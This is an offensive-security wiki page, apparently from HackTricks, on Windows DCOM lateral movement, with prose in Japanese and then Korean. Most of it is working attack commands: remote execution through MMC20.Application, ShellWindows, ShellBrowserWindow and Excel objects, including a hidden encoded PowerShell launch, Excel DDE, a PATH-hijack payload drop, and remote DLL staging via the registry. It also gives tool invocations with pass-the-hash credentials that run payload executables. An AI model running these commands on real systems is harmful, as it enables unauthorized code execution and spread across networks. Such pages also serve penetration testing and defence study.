# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement では、サービスや scheduled task を作成する代わりに、RPC/DCOM 経由で公開されている既存の COM server を再利用できます。実際には、通常、最初の接続は TCP/135 で開始し、その後、動的に割り当てられた高位の RPC port に移行します。

## 前提条件と注意点

- 通常、ターゲット上で local administrator のコンテキストが必要です。また、リモート COM server でリモートからの launch/activation が許可されている必要があります。
- **2023 年 3 月 14 日**以降、Microsoft はサポート対象システムで DCOM hardening を適用しています。activation authentication level の低い値を要求する古いクライアントは、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` でネゴシエートできない場合、失敗する可能性があります。最新の Windows クライアントでは通常、自動的に引き上げられるため、現在のツールは通常そのまま動作します。<sup>[[3]](#references)</sup>
- 手動またはスクリプトによる DCOM 実行では、通常、TCP/135 に加えてターゲットの動的 RPC port 範囲へのアクセスが必要です。Impacket の `dcomexec.py` を使い、コマンドの出力を取得したい場合は、通常、`ADMIN$`（または別の読み書き可能な share）への SMB アクセスも必要です。
- RPC/DCOM は機能するものの SMB がブロックされている場合でも、`dcomexec.py -nooutput` は blind execution に役立つことがあります。

簡単な確認：

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

이 technique에 대한 자세한 내용은 [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)를 확인하세요.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) 객체는 네트워크를 통해 객체와 상호작용할 수 있는 흥미로운 기능을 제공합니다. Microsoft는 DCOM과 Component Object Model (COM)에 대한 포괄적인 문서를 제공하며, 각각 [여기에서 DCOM 문서](https://msdn.microsoft.com/en-us/library/cc226801.aspx), [여기에서 COM 문서](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)를 확인할 수 있습니다. PowerShell 명령을 사용하면 DCOM 애플리케이션 목록을 가져올 수 있습니다:

```bash
Get-CimInstance Win32_DCOMApplication
```

COM 개체인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)은 MMC 스냅인 작업을 스크립트로 실행할 수 있게 합니다. 특히 이 개체에는 `Document.ActiveView` 아래에 `ExecuteShellCommand` 메서드가 있습니다. 이 메서드에 관한 자세한 내용은 [여기](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)에서 확인할 수 있습니다. 다음과 같이 실행해 확인합니다:<sup>[[6]](#references)</sup>

이 기능을 사용하면 DCOM 애플리케이션을 통해 네트워크에서 명령을 실행할 수 있습니다. 관리자로 원격 DCOM과 상호작용하려면 다음과 같이 PowerShell을 사용할 수 있습니다:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

이 명령은 DCOM 애플리케이션에 연결하고 COM object의 인스턴스를 반환합니다. 그런 다음 ExecuteShellCommand 메서드를 호출해 원격 호스트에서 프로세스를 실행할 수 있습니다. 이 과정은 다음 단계를 따릅니다.

메서드 확인:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

RCE 획득:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

마지막 인수는 창 스타일입니다. `7`은 창을 최소화된 상태로 유지합니다. 실제로 MMC 기반 실행은 일반적으로 원격 `mmc.exe` 프로세스가 페이로드를 생성하는 방식으로 이어지며, 이는 아래의 Explorer 기반 객체와 다릅니다.

## ShellWindows & ShellBrowserWindow

**이 기법에 대한 자세한 내용은 원문 게시물을 확인하세요 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** 객체에는 애플리케이션별 `LaunchPermission` 값이 없는 것으로 확인되었습니다.<sup>[[2]](#references)</sup> 이것만으로 액세스 권한이 부여되는 것은 아닙니다. COM은 해당되는 경우 시스템의 `DefaultLaunchPermission` ACL과 시스템 전체의 시작/액세스 제한을 확인합니다.<sup>[[9]](#references)[[10]](#references)</sup> 자세한 내용은 [여기](https://twitter.com/tiraniddo/status/817532039771525120)에서 스레드를 확인할 수 있으며, 명시적인 Launch Permission이 없는 객체를 필터링하려면 [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET을 사용하는 것이 좋습니다.

명시적인 Launch Permissions가 없다는 점에서 `ShellBrowserWindow`와 `ShellWindows`라는 두 객체가 주목받았습니다.<sup>[[2]](#references)</sup> `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` 값이 없다는 것은 애플리케이션별 시작 ACL이 없다는 뜻이지, 원격 활성화가 제한 없이 허용된다는 뜻은 **아닙니다**.<sup>[[9]](#references)[[10]](#references)</sup>

`MMC20.Application`과 비교하면, 원격 호스트에서 명령이 `mmc.exe` 대신 `explorer.exe`의 자식 프로세스로 실행되는 경우가 많으므로 OPSEC 측면에서 흔히 더 눈에 띄지 않습니다.

### ShellWindows

ProgID가 없는 `ShellWindows`의 경우, .NET 메서드인 `Type.GetTypeFromCLSID`와 `Activator.CreateInstance`를 사용하면 CLSID를 통해 객체를 인스턴스화할 수 있습니다. 이 과정에서는 OleView .NET을 사용해 `ShellWindows`의 CLSID를 가져옵니다. 객체를 인스턴스화한 후에는 `WindowsShell.Item` 메서드로 상호작용하여 `Document.Application.ShellExecute`와 같은 메서드를 호출할 수 있습니다.<sup>[[2]](#references)</sup>

객체를 인스턴스화하고 원격으로 명령을 실행하는 PowerShell 명령 예제가 제공되었습니다:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow`도 비슷하지만, CLSID를 통해 직접 인스턴스화하고 `Document.Application.ShellExecute`로 pivot할 수 있습니다:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Excel DCOM Objects를 이용한 Lateral Movement

DCOM Excel objects를 악용해 Lateral Movement를 수행할 수 있습니다. 자세한 내용은 DCOM을 통한 Lateral Movement에 Excel DDE를 활용하는 방법을 설명한 [Cybereason의 블로그](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)를 참고하세요.<sup>[[5]](#references)</sup>

Empire 프로젝트는 DCOM objects를 조작해 Excel을 이용한 원격 코드 실행(RCE)을 시연하는 PowerShell 스크립트를 제공합니다. Excel을 악용해 RCE를 수행하는 여러 방법을 보여주는 스크립트 일부는 [Empire의 GitHub 저장소](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)에서 확인할 수 있습니다:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

최근 연구에서는 `Excel.Application`의 `ActivateMicrosoftApp()` 메서드를 활용해 이 영역을 확장했습니다. 핵심 아이디어는 Excel이 시스템 `PATH`에서 FoxPro, Schedule Plus, Project와 같은 레거시 Microsoft 애플리케이션을 검색해 실행할 수 있다는 것입니다. 공격자가 대상의 `PATH`에 포함된 쓰기 가능한 위치에 예상되는 이름으로 payload를 배치할 수 있다면 Excel이 이를 실행합니다.<sup>[[4]](#references)</sup>

이 변형을 위한 요구 사항:

- 대상에서 로컬 관리자 권한
- 대상에 Excel 설치
- 대상의 `PATH`에 포함된 쓰기 가능한 디렉터리에 payload를 쓸 수 있는 권한

FoxPro 검색(`FOXPROW.exe`)을 악용하는 실제 예:

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

공격 호스트에 로컬 `Excel.Application` ProgID가 등록되어 있지 않으면, 대신 CLSID를 사용해 원격 개체를 인스턴스화합니다:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

실제 악용 사례에서 확인된 값:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 등록된 Control Panel DLL 로드

`COpenControlPanel` 클래스(CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`)는 `IOpenControlPanel`(IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`)을 노출합니다. 이 클래스의 `Open()` 메서드를 호출하면 `Control Panel\Cpls` 키에 등록된 Control Panel DLL이 원격 `dllhost.exe`에 의해 로드됩니다. 테스트한 시스템에서 이 클래스에는 명시적인 실행/액세스 권한이 없으므로 기본 DCOM 정책을 따릅니다(일반적으로 원격 활성화에는 관리자 권한이 필요함). 임의의 항목 이름만으로도 `Open()`이 등록된 DLL을 처리하게 할 수 있습니다. 페이로드에 `.cpl` 확장자는 필요하지 않지만, 올바른 아키텍처의 유효한 DLL이어야 합니다.<sup>[[7]](#references)</sup>

이 프리미티브는 **stage-and-trigger** 방식이지, 명령만으로 실행하는 방식이 아닙니다. 먼저 DLL을 대상에 복사하고 해당 DLL을 가리키는 `REG_EXPAND_SZ` 값을 만든 다음, DCOM을 통해 객체를 활성화해야 합니다. 예를 들어, 관리자 권한의 Windows 환경에서 다음과 같이 실행합니다.<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

공개된 [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) 클라이언트는 Impacket를 사용해 문서화되지 않은 DCOM 호출을 구현합니다. 임의의 Control Panel 항목 이름을 지정하는 것만으로 충분하며, `dllhost.exe`가 DLL을 로드했더라도 클라이언트에서 RPC 오류를 보고할 수 있습니다.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

운영상 이 경로에는 파일 쓰기 채널과 원격 레지스트리 액세스도 필요하므로 `MMC20`/`ShellWindows`보다 더 눈에 띕니다. 나중에 제어판을 열면 같은 항목을 다시 로드할 수 있어 persistence 부작용이 발생합니다. 실행 후 해당 값을 제거하고, `dllhost.exe`에서 비정상적인 DLL 로드와 함께 예상치 못한 `Control Panel\Cpls` 값을 찾아보세요.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Lateral Movement 자동화 도구

이러한 기법을 자동화하는 두 가지 도구를 소개합니다.

- **Invoke-DCOM.ps1**: Empire 프로젝트에서 제공하는 PowerShell 스크립트로, 원격 머신에서 코드를 실행하는 여러 메서드를 간편하게 사용할 수 있습니다. 이 스크립트는 Empire GitHub 저장소에서 확인할 수 있습니다.

- **SharpLateral**: 원격으로 코드를 실행하도록 설계된 도구이며, 다음 명령어로 사용할 수 있습니다:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## 자동화 도구

- Powershell 스크립트 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)를 사용하면 다른 머신에서 코드를 실행하는 모든 주석 처리된 방법을 쉽게 호출할 수 있습니다.
- Impacket의 `dcomexec.py`를 사용하면 DCOM을 통해 원격 시스템에서 명령을 실행할 수 있습니다. 현재 빌드에서는 `ShellWindows`, `ShellBrowserWindow`, `MMC20`을 지원하며, 기본값은 `ShellWindows`입니다.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- [**SharpLateral**](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [**SharpMove**](https://github.com/0xthirteen/SharpMove)도 사용할 수 있습니다.

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [MMC20.Application COM Object를 사용한 Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM을 통한 Lateral Movement: 2라운드](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass 변경 사항 관리 (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application의 강력한 기능 악용](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM을 통한 Lateral Movement를 위해 Excel DDE 활용](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [원격 명령 실행을 위한 DCOM 객체 사용](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: 부록 B, 제품 동작 - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
